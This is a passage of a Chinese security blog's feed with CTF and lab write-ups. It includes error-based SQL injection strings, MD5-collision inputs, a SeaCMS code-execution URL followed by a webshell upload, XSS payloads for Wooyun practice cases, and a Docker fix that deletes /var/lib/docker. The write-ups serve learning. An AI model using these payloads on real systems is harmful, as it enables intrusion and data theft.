class="line">纸机中居然是一堆黑色和白色的碎片，但是这些碎片之中到底会有什么样的宝藏呢？</span><br><span class="line"></span><br><span class="line">我去问了欧鹏·曦文同学，他说他有办法恢复拼图原貌，但是前提是要我把真正有用的东西给他。</span><br></pre></td></tr></table></figure><p>附脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">flag_pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">143</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> fn <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#循环出现文件名的后缀数字</span></span><br><span class="line"></span><br><span class="line">    fp=<span class="built_in">open</span>(<span class="string">r&#x27;/root/文档/CTF/fsj/fsj2/puzzle&#x27;</span>+<span class="built_in">str</span>(fn)+<span class="string">&#x27;.jpg&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)  <span class="comment">#此处为文件路径及文件名</span></span><br><span class="line"></span><br><span class="line">    all_data=<span class="built_in">bytearray</span>(fp.read())</span><br><span class="line"></span><br><span class="line">    data=all_data[-<span class="number">1250</span>:]                           <span class="comment">#读图片最后1250位</span></span><br><span class="line"></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGBA&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))   <span class="comment">#新建图像对象,RGBA通道,xy轴为50,颜色为white(255,255,255)</span></span><br><span class="line"></span><br><span class="line">    dex=<span class="number">0</span>                                           <span class="comment">#初始化标记位为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片上半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex])) <span class="comment">#设置坐标(j,i) 颜色为(255-data[dex],255-data[dex],255-data[dex])</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">25</span>):                       <span class="comment">#两层循环,写入图片下半部分颜色</span></span><br><span class="line"></span><br><span class="line">            pic.putpixel((j,i+<span class="number">25</span>),(<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex],<span class="number">255</span>-data[dex]))  <span class="comment">#设置坐标(j,i+25) RGB值同上</span></span><br><span class="line"></span><br><span class="line">            dex=dex+<span class="number">1</span>                                                       <span class="comment">#标记位+1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">13</span>,<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> pic.getpixel((x,y)) &lt; pic.getpixel((x+<span class="number">13</span>,y)):    <span class="comment">#若x轴0~12的像素值 小于 13~25的值,则写入 0~12的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x,y)))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:                                               <span class="comment">#否则写入后 13~25的像素值</span></span><br><span class="line"></span><br><span class="line">                flag_pic.putpixel((x+fn*<span class="number">13</span>,y),pic.getpixel((x+<span class="number">13</span>,y)))</span><br><span class="line"></span><br><span class="line">flag_pic.show()</span><br></pre></td></tr></table></figure><p>得出<br><a href="https://i.loli.net/2019/05/06/5cd03841efaf8.png" title="欧鹏·曦文"><img src="https://i.loli.net/2019/05/06/5cd03841efaf8.png" alt="欧鹏·曦文" title="欧鹏·曦文"></a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Troubleshooting Docker Installation on Kali Linux</title>
      <link href="/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/"/>
      <url>/2019/05/14/Troubleshooting-Docker-Installation-on-Kali-Linux/</url>
      
        <content type="html"><![CDATA[<p>Kali安装docker:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D</span><br><span class="line">echo &#x27;deb https://apt.dockerproject.org/repo debian-stretch main&#x27; &gt; /etc/apt/sources.list.d/docker.list</span><br><span class="line">apt-get install apt-transport-https ca-certificates</span><br><span class="line">apt-get update &amp;&amp; sudo apt-get install docker-engine</span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用加速器加快镜像的下载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi  /etc/docker/daemon.json</span><br><span class="line">输入一下内容即可</span><br><span class="line">&#123;&quot;registry-mirrors&quot;:[&quot;https://registry.docker-cn.com&quot;]&#125;</span><br></pre></td></tr></table></figure><h3 id="Error"><a href="#Error" class="headerlink" title="Error:"></a>Error:</h3><p>如果用完docker未通过正确方式关闭，导致下次docker无法开启，那么解决方案：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /var/lib/docker/</span><br><span class="line">vim /etc/docker/daemon.json</span><br><span class="line">add：</span><br><span class="line"> &#123; &quot;graph&quot;: &quot;/mnt/docker-data&quot;, &quot;storage-driver&quot;: &quot;overlay&quot; &#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Issues </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019 Jiaweisi Cup Web</title>
      <link href="/2019/03/20/2019-Jiaweisi-Cup-Web/"/>
      <url>/2019/03/20/2019-Jiaweisi-Cup-Web/</url>
      
        <content type="html"><![CDATA[<p>由于时间关系大部分我只给出解题过程，图就不贴了</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>试了一下发现union 不行，那就试试<br>报错注入：<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select database())),1)) #<br>发现爆库成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1)) #<br>爆表成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’flag’)),1)) #<br>爆列成功！<br>and 1&#x3D;(updatexml(1,concat(0x3a,(select group_concat(flag) from flag)),1)) #</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>进入页面，发现被base64了，解码后，发现是JS加密，放入控制台得到flag</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>频谱转换发现flag:….(一串字符) 但这并不是真正的flag，至于真正的flag我也没找到</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>Base64很明显，我们只需一直解码即可，每组字数为5<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c5fc16c5d40212f5.png" alt="img"></p><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>。。。。</p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>要计算，正则，得py得天下</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-705576ee4ca079f1.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-28eb722e7bb32bd4.png" alt="img1"></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>。。。</p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>你能解开这段密文吗？<br>ASCII差值<br>根据密文：<br>s——{<br>Z——c<br>*——4<br>Z——e<br>g——s<br>‘——4<br>d——r<br>b——f<br>g——l<br>[——a<br>&#96;——g</p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>。。。</p><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>。。。</p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>抓包 发现隐藏的代码<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-5e34a9fbf7ecf483.png" alt="img"><br>这串呢?一上来就把你传的参数转化为string类型，所以用数组的方法是不行了。<br>只能是MD5碰撞了，就是不相同的字符恰好有着一样的MD5。fastcoll_v1.0.0.5.exe工具可以给弄出来。<br>但是别忘了url<br>param1&#x3D;%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP&amp;param2&#x3D;%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF&#x2F;a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d706e963fd888e1a.png" alt="img"></p><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>。。。</p><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>逆序解码base64,发现是1，</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>发现是海洋CMS漏洞<br>搜索漏洞找了一个版本的<br>构造payload<br><a href="http://47.103.43.235:84/search.php?searchtype=5&amp;searchword=%7Bif%7Bsearchpage:year%7D&amp;year=:e%7Bsearchpage:area%7D%7D&amp;area=v%7Bsearchpage:letter%7D&amp;letter=al%7Bsearchpage:lang%7D&amp;yuyan=(join%7Bsearchpage:jq%7D&amp;jq=($_P%7Bsearchpage:ver%7D&amp;&amp;ver=OST%5B9%5D))">http://47.103.43.235:84/search.php?searchtype=5&amp;searchword=%7Bif%7Bsearchpage:year%7D&amp;year=:e%7Bsearchpage:area%7D%7D&amp;area=v%7Bsearchpage:letter%7D&amp;letter=al%7Bsearchpage:lang%7D&amp;yuyan=(join%7Bsearchpage:jq%7D&amp;jq=($_P%7Bsearchpage:ver%7D&amp;&amp;ver=OST%5B9%5D))</a><br>上传一句话，菜刀连接，</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-213c2975a00ad29d.png" alt="img"></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-8de5ebc3b037d719.png" alt="img"></p><p>根目录下发现flag文件</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d71e0956ff4c88c0.png" alt="img"><br>抓包发现，我们打开发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-d5d9fe7a9bdf98e4.png" alt="img"></p><p>分析代码逻辑，发现POST了两个字段name和password，获得flag要求的条件是：name !&#x3D; password &amp; sha1(name) &#x3D;&#x3D; sha1(password)，乍看起来这是不可能的，其实可以利用sha1()函数的漏洞来绕过。如果把这两个字段构造为数组，如：?name[]&#x3D;a&amp;password[]&#x3D;b，这样在第一处判断时两数组确实是不同的，但在第二处判断时由于sha1()函数无法处理数组类型，将报错并返回false，if 条件成立，获得flag。<br>经验证md5()函数同样存在此漏洞。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Wooyun Practice</title>
      <link href="/2019/03/14/XSS-Wooyun-Practice/"/>
      <url>/2019/03/14/XSS-Wooyun-Practice/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title="&lt;1&gt;"></a>&lt;1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/1.php?umod=commentsoutlet&act=count&siteid=3&libid=9&dataid=1480&score=1&func=haoping&_=1353475261886">点击进入本例模拟环境</a></p><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p>经过测试，我们发现，当在score后输入&lt;&gt;HTML标签时，查看源码，发现<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-146fd79b3e828812.png" alt="图片.png"><br>这便说明存在XSS漏洞，<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-165da5857bda9eaf.png" alt="图片.png"></p><h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><blockquote><p>a. 通常，我们只需要在输出前，将 &lt; , &gt; 过滤掉即可。<br>b. 这类XSS在小型网站中比较常见，在大型网站中少见。<br>c. 这类XSS通常都被浏览器的XSS过滤器秒杀了，所以一般来说，威力较小。<br>d. 对于普通用户来说，请使用IE8及以上版本（并开启XSS过滤器功能，默认开启），或chrome浏览器，将可以防御大部分此种类型的XSS攻击。</p></blockquote><h2 id="-1"><a href="#-1" class="headerlink" title="&lt;2&gt;"></a>&lt;2&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/2.php?callback=wooyun">点击进入本例模拟环境</a></p><h3 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h3><p>输入aaaaaa&lt;&gt;我们发现出现位置如下<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-4a74c579a0bc17f4.png" alt="图片.png"></p><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><p>1 首先判断，是否过滤了 &lt; , &gt; , &#x2F; 等符号，<br>2 如果都没有过滤，恭喜你，一般可以直接XSS了。代码如下：<br><code>http://activity.soso.com/common/setParentsInfo.php?callback=aaaaaaaaa&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-55230f15cb0919eb.png" alt="图片.png"></p><p><strong>但是天有不测风雨， 如果过滤了 &lt;, &gt;，那么就无法使用上面的办法了</strong></p><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>构造js代码：<br><code>eval(&#39;alert(1)&#39;);void</code><br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e56b7d25794f2ef4.png" alt="图片.png"><br><strong>payload是不固定的，也就是说，我们插入的内容，使得这一段javascript依然【语法正确】，能够【正确执行】，并且能够执行【我们所插入的JS代码】，这样我们的目的就达到了。<br>类似于var a&#x3D;”[输出]”; &#x2F;&#x2F; 不过通常程序员会把 “ 过滤掉， 这样的话，一般来说，我们就很难构造。</strong></p><h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 过滤 &lt;/xxx&gt; 组合 </span><br><span class="line">2. 针对输出在不同的场景，进行合适的过滤。 </span><br></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title="&lt;3.1&gt;"></a>&lt;3.1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.1.php?word=%E4%B9%8C%E4%BA%91%E6%AC%A2%E8%BF%8E%E6%82%A8">点击进入本例模拟环境 3.1</a></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;，发现被过滤了，查看源码发现，双引号不会被过滤，故我们因此构想payload</p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-0b776c42fbc43c3b.png" alt="图片.png"><br>当用户点击这个文本框时，就会触发 XSS</p><h2 id="-3"><a href="#-3" class="headerlink" title="&lt;3.2&gt;"></a>&lt;3.2&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.2.php?c=follow&a=index&appkey=801004516&bg=ffffff&hsize=80&name=Zhanglifenft,chengyizhong,xiangyang20112007,linchufang,leonardoit,linchufang,qingfengxu6685,zhouzhichen001,yuguoming-ruc,luomingtitan,bjwbgq,kezuozongbianji,weibotalk,lee007,jxzhongweizhi,lihaipengtx">点击进入本例模拟环境 3.2</a></p><h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;&#x2F;“(),发现只有&#x2F;没有被过滤，如何只用 \ 构造利用语句呢，我们可以想到CSS 中的字符编码，CSS 提供了一套转义处理策略，一个反斜杠后边跟1~6位十六进制数字。然后利用CSS 的expression 来调用JavaScript 代码。也就是试图构造出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression(eval(alert(/xss/))</span><br></pre></td></tr></table></figure><h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>完整的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body style=&quot;... background-color:;width:expression(eval(alert(/xss/)))&quot;&gt;</span><br></pre></td></tr></table></figure><p>完整的payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bg=;w:expr\65ssion\28%20eval\28\27\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\64\6f\63\75\6d\65\6e\74\2e\63\6f\6f\6b\69\65\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\7d\27\29\29</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用分号来结束backgroud-color,然后 w: 后边跟上expression,如果expression 要被过滤，那就加上转义，把expression 随意变下形就可以，于是，在下边这样的代码构造下，漏洞又被利用了。</p><p>试了很多次，发现一直不出现XSS，原来</p><blockquote><p>expression 当年是微软搞出来的技术，但是一直没被其他浏览器接受，同时，甚至微软自己如今也抛弃了这种特性，它出现在IE6，IE7，和IE8的一些早期版本，因为微软官方也认为该属性不具有通用性，而且它处理的事务，如今已经能够在CSS 中正常的完成，如min-width,max-width， 这些都已经在IE8之后得到很好的支持，所以expression 也只能在这两个古老版本上起效。</p></blockquote><h2 id="-4"><a href="#-4" class="headerlink" title="&lt;3.3&gt;"></a>&lt;3.3&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/3.3.php?searchtype_yjbg=yjjg&searchvalue_yjbg=wooyun">点击进入本例模拟环境 3.3</a></p><h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>输入aaaaaaaa&lt;&gt;’&#x2F;“()测试<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-c5404d1c9683848b.png" alt="图片.png"><br>根据测试，我们发现只有&#x2F;,(),’这三个符号没被过滤，而且攻击点在第二个等于后面。<br>……..&amp;searchvalue_yjbg&#x3D;aaaaaa’</p><p>…….&amp;searchvalue_yjbg&#x3D;aaaaaa’+alert(1)+’’</p><p>……..&amp;searchvalue_yjbg&#x3D;aaaaaa&#x27;+alert(1)+&amp;#x27</p><h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p>&amp;: %26, #: %23,+:%2b,’:%27<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaaa%26%23x27;%2balert(1)%2b%26%23x27</span><br></pre></td></tr></table></figure><p>由于缺陷点是发生在 onkeydown 或 a 标签的 href 属性中，无法自动触发，因而使得威胁减小，如果是发生在 img 的 onload 属性，则非常可能导致自动触发，故需手动点击GO触发XSS。</p><h3 id="修复方法-综合以上三个"><a href="#修复方法-综合以上三个" class="headerlink" title="修复方法(综合以上三个)"></a>修复方法(综合以上三个)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 对于输出在HTML属性中的情况，需要特殊情况特殊对待，该过滤\的时候，请过滤\, 该过滤&amp;的情况，则过滤掉&amp;</span><br><span class="line">2. 碰到有某些修复的人用正则去判断， &amp;#xNNN.., 而实际上 &amp;#x0NN; &amp;#x00NN, （后面自己慢慢试。。） 都是可以的。 或者是 &amp;#10进制; 以及一些特殊的HTML实体，如 &amp;quot;等，都要注意到，好麻烦， 最好的办法，还是 &amp;过滤为 &amp;amp; ：） </span><br></pre></td></tr></table></figure><h2 id="-5"><a href="#-5" class="headerlink" title="&lt;4&gt;"></a>&lt;4&gt;</h2><h3 id="测试-3"><a href="#测试-3" class="headerlink" title="测试"></a>测试</h3><p>输入&lt;&gt;’&#x2F;()“<br>发现”&lt;&gt;被过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-e458edaebaf15da7.png" alt="图片.png"><br>我们发现还有一个”没有闭合，但是直接加上”，会被过滤，所以我们想到&#x2F;&#x2F;注释符号将它注释即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;alert(1)//</span><br></pre></td></tr></table></figure><p>发现还不行<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-4512beb2556d627e.png" alt="图片.png"><br>不难想到这是代码，结尾要用;，故</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&quot;;alert(1)//</span><br></pre></td></tr></table></figure><h3 id="修复方案-1"><a href="#修复方案-1" class="headerlink" title="修复方案"></a>修复方案</h3><p>修复相关过滤机制。</p><h1 id="-6"><a href="#-6" class="headerlink" title="&lt;5&gt;"></a>&lt;5&gt;</h1><p><a href="http://mail.qq.com/cgi-bin/login?vt=passport&ss=aaa&from=bbb&delegate_url=/cgi-bin/frame_html?url=%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1">这道题不能用</a><br>由于网站问题，本题只出示思路。</p><h3 id="测试-4"><a href="#测试-4" class="headerlink" title="测试"></a>测试</h3><p>输入常用符号，经过测试，我们可以看到，双引号是用不了， 但是 反斜线还可以使用。\可以用</p><h3 id="提取缺陷代码"><a href="#提取缺陷代码" class="headerlink" title="提取缺陷代码"></a>提取缺陷代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">getTop</span>().<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;</span>+<span class="string">&quot;&amp;t=&quot;</span>+<span class="string">&quot;&amp;alias=&quot;</span>+<span class="string">&quot;&amp;regalias=&quot;</span>+<span class="string">&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;</span>+<span class="string">&quot;&amp;title=&quot;</span>+<span class="string">&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb%5C%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1&quot;</span>+<span class="string">&quot;&amp;org_fun=&quot;</span>+<span class="string">&quot;&amp;aliastype=&quot;</span>+<span class="string">&quot;&amp;ss=aaa&quot;</span>+<span class="string">&quot;&amp;from=bbb&quot;</span>+<span class="string">&quot;&amp;param=&quot;</span>+<span class="string">&quot;&amp;sp=6fa57ce5b3047ebMTM1NTQwOTA2Mg&quot;</span>+<span class="string">&quot;&amp;r=3ec785174fff5206ed6f0cf4a8c5e3c5&quot;</span>+<span class="string">&quot;&amp;ppp=&quot;</span>+<span class="string">&quot;&amp;secpp=&quot;</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="缺陷部分"><a href="#缺陷部分" class="headerlink" title="缺陷部分"></a>缺陷部分</h3><p>“………”+”&amp;ss&#x3D;aaaa”+”&amp;from&#x3D;bbb”+”&amp;param&#x3D;”;</p><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><p>反斜线是用来表示转义，我们要控制aaaa但是不能使用双引号，这时就可以用反斜线进行对双引号的转义，<br>语法发生变化：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;getTop().location.href=&quot;......&quot;+ &quot;&amp;ss=aaa\&quot;+&quot; &amp;from=bbb &quot;+&quot; ¶m= &quot;+&quot; .....&quot;;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这样看起来虽然前面的语法正确，但是后面的语句却不太正常，故，我们只需使用&#x2F;&#x2F;将后面的语句进行注释即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from=1//&quot;+&quot;¶m=&quot;;</span><br></pre></td></tr></table></figure><p>但是还有一个问题，&amp; 在这里，被考虑成了一个与操作，优先级是高于 &#x3D;号的，变成了(“字符串”&amp;from)&#x3D;1 的语法，这仍然是错误的。但是，如果我们再测试一下，&#x3D; 号会不会被屏蔽呢，&#x3D;号也可以用，那么我们改变一下语法，添加一个等号，变成 &#x3D;&#x3D;：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1//&quot;+&quot;¶m=&quot;;</span><br></pre></td></tr></table></figure><p>于是语法编程了(“string”)&amp;(from&#x3D;&#x3D;1)的样式，from 变成了一个bool操作，但现在又面临了新的问题，如果你在URL 里本来该是一个定义的操作，却变成了一个判断的操作，from 就变成了未定义的状态了，语法仍然会报错，这我们就要进一步理解JavaScript的语法了，如果我们把from 当做一个变量或者是方法，如果是方法，无论在何处定义，都会被拉到最简便，利用这样一个特性，我们的代码可以改改。</p><figure class="highlight 